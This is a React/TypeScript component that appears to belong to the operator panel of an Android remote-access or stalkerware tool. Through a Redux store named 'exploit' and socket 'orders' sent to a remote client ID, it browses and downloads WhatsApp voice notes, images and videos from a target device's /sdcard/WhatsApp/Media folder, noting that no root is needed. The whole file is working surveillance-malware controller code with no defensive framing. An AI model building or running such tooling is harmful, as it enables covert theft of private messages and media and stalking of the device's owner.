import { useState } from "react";
import { Button } from "@/components/ui/button";
import {
  Music,
  Image as ImageIcon,
  Video,
  Mic,
  RefreshCw,
  Download,
  Play,
} from "lucide-react";
import { emitOrder } from "@/lib/socket";
import { useAppSelector } from "@/store/hooks";

export function WhatsAppMediaTab({ clientId }: { clientId: string }) {
  const media = useAppSelector(
    (s) => s.exploit.byClient[clientId]?.whatsappMedia ?? [],
  );
  const currentType = useAppSelector(
    (s) => s.exploit.byClient[clientId]?.whatsappMediaType ?? "audio",
  );

  const [selectedFile, setSelectedFile] = useState<string | null>(null);

  const loadMedia = (type: string) => {
    emitOrder(clientId, "whatsapp_media", { mediaType: type });
  };

  const handleDownload = (file: any) => {
    emitOrder(clientId, "file_download", { path: file.path });
  };

  const tabs = [
    { id: "voice", label: "Voice Notes", icon: Mic },
    { id: "audio", label: "Audio", icon: Music },
    { id: "images", label: "Images", icon: ImageIcon },
    { id: "video", label: "Video", icon: Video },
  ];

  const audioFiles = media.filter((f) =>
    f.type?.match(/\.(opus|mp3|m4a|aac|ogg|wav|amr)$/),
  );
  const imageFiles = media.filter((f) =>
    f.type?.match(/\.(jpg|jpeg|png|gif|webp)$/),
  );
  const videoFiles = media.filter((f) => f.type?.match(/\.(mp4|3gp|mkv|avi)$/));

  const currentFiles =
    currentType === "images"
      ? imageFiles
      : currentType === "video"
        ? videoFiles
        : audioFiles;

  return (
    <div className="space-y-4">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-2">
          <Music className="h-4 w-4 text-green-400" />
          <h3 className="text-sm font-semibold text-zinc-100">
            WhatsApp Media
          </h3>
        </div>
        <span className="text-xs text-zinc-500">{media.length} files</span>
      </div>

      <p className="text-xs text-zinc-500">
        Browse audio, images, and video files from WhatsApp Media folder. No
        root needed — reads /sdcard/WhatsApp/Media/.
      </p>

      {/* Tabs */}
      <div className="flex gap-2 flex-wrap">
        {tabs.map((tab) => {
          const Icon = tab.icon;
          const isActive = currentType === tab.id;
          const count =
            tab.id === "images"
              ? imageFiles.length
              : tab.id === "video"
                ? videoFiles.length
                : audioFiles.length;

          return (
            <button
              key={tab.id}
              onClick={() => loadMedia(tab.id)}
              className={`flex items-center gap-1.5 px-3 py-1.5 rounded text-xs ${
                isActive
                  ? "bg-green-500/20 text-green-200 ring-1 ring-green-500/40"
                  : "bg-zinc-900 text-zinc-400 ring-1 ring-white/10 hover:bg-zinc-800"
              }`}
            >
              <Icon className="h-3.5 w-3.5" />
              {tab.label}
              {count > 0 && (
                <span className="text-[10px] opacity-70">({count})</span>
              )}
            </button>
          );
        })}
        <Button
          size="sm"
          variant="outline"
          onClick={() => loadMedia(currentType)}
          className="ml-auto bg-transparent border-white/15 text-zinc-300 hover:bg-white/5 h-7"
        >
          <RefreshCw className="h-3.5 w-3.5" /> Refresh
        </Button>
      </div>

      {/* Files list */}
      <div className="rounded-xl border border-white/10 bg-zinc-900/40 p-3 max-h-[55vh] overflow-y-auto scrollbar-emerald">
        {currentFiles.length === 0 ? (
          <div className="py-8 text-center text-xs text-zinc-600">
            No {currentType} files found. Tap a tab to load.
          </div>
        ) : (
          <div className="space-y-1">
            {currentFiles.map((file: any, i: number) => (
              <div
                key={i}
                className="flex items-center gap-2 px-2 py-1.5 rounded hover:bg-white/[0.03] text-xs group"
              >
                <span className="grid h-7 w-7 place-items-center rounded bg-green-500/10 text-green-300 ring-1 ring-green-500/20 shrink-0">
                  {file.type?.includes("opus") || file.type?.includes("mp3") ? (
                    <Music className="h-3.5 w-3.5" />
                  ) : file.type?.includes("jpg") ||
                    file.type?.includes("png") ? (
                    <ImageIcon className="h-3.5 w-3.5" />
                  ) : (
                    <Video className="h-3.5 w-3.5" />
                  )}
                </span>

                <div className="min-w-0 flex-1">
                  <div className="text-zinc-200 truncate">{file.name}</div>
                  <div className="text-[10px] text-zinc-500 flex items-center gap-2">
                    <span>{formatSize(file.size)}</span>
                    <span>·</span>
                    <span>{formatDate(file.lastModified)}</span>
                    {file.folder && (
                      <>
                        <span>·</span>
                        <span className="text-blue-400/70">{file.folder}</span>
                      </>
                    )}
                    {file.source && (
                      <>
                        <span>·</span>
                        <span
                          className={`font-mono ${
                            file.source === "base"
                              ? "text-blue-400/70"
                              : file.source === "legacy"
                                ? "text-orange-400/70"
                                : "text-purple-400/70"
                          }`}
                        >
                          {file.source === "base"
                            ? "📁 Base"
                            : file.source === "legacy"
                              ? "📁 Legacy"
                              : `📁 ${file.source}`}
                        </span>
                      </>
                    )}
                  </div>
                </div>

                <div className="flex gap-1 opacity-0 group-hover:opacity-100">
                  <Button
                    size="sm"
                    onClick={() => handleDownload(file)}
                    className="h-7 px-2 bg-emerald-500/15 text-emerald-300 ring-1 ring-emerald-500/30 hover:bg-emerald-500 hover:text-zinc-950"
                  >
                    <Download className="h-3 w-3" /> Get
                  </Button>
                </div>
              </div>
            ))}
          </div>
        )}
      </div>
    </div>
  );
}

function formatSize(bytes: number): string {
  if (!bytes) return "0 B";
  const units = ["B", "KB", "MB", "GB"];
  let size = bytes;
  let i = 0;
  while (size >= 1024 && i < units.length - 1) {
    size /= 1024;
    i++;
  }
  return `${size.toFixed(1)} ${units[i]}`;
}

function formatDate(ts: number): string {
  if (!ts) return "";
  return new Date(ts).toLocaleString();
}
